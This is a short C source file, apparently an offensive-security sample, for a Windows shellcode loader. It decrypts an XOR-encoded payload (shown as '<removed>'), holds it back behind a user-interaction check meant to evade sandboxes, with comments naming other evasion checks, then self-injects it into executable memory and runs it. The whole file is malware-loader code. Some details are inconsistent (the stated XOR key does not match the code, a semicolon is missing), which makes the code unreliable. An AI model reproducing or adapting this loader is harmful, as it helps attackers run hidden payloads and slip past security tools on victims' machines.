// Inspired from: https://www.ired.team/offensive-security/code-injection-process-injection/process-injection

#include "stdio.h"
#include "Windows.h"
#include "../functions.h"

int main(int argc, char* argv[])
{
	/* length: 927 bytes */
	//unsigned char buf[] = "<removed>";

	// Shellcode encrypted with XOR (key=22)
	unsigned char buf[] = "<removed>"

	// Could be replaced by:
	//  * Check an environment var
	//  * Check if a registry key exist
	//  * Check if a file exist
	//  * Check if the machine have a network card or an IP address
	int ret = insert_user_interaction();

	if (ret == 1) {
		// Decrypt shellcode
		for (int x = 0; x < 927; x++) {
			*((char*)buf + x) = *((char*)buf + x) ^ '\xab';
		}

		// Self-inject
		void* exec = VirtualAlloc(0, sizeof buf, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		memcpy(exec, buf, sizeof buf);
		((void(*)())exec)();
	}

	return 0;
}
